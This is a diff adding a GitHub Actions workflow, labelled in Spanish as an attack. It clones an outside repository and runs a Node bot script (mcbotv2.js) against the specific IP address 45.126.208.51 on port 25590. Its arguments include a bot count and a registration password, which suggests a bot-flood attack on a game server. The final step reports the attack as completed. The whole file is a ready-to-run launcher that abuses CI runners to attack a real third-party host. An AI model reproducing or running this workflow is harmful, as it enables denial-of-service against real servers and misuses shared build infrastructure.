@@ -1,0 +1,24 @@
+name: Ata1a
+on:
+  workflow_dispatch:
+
+jobs:
+  anak:
+    runs-on: ubuntu-latest
+    timeout-minutes: 1
+    
+    steps:
+      - name: Clonar repositorio
+        run: |
+          git clone https://github.com/ricardocraft121-gif/ssh2.git
+          
+      - name: Entrar y ejecutar ataque
+        run: |
+          cd ssh2
+          timeout 25 node mcbotv2.js 45.126.208.51 25590 Bot 44444 25 "/register Gays1*923|Hoaolsozozososkksksksk" 1
+          
+      - name: Limpiar
+        if: always()
+        run: |
+          echo "✅ Ataque completado después de 20 segundos"
+          sleep 2
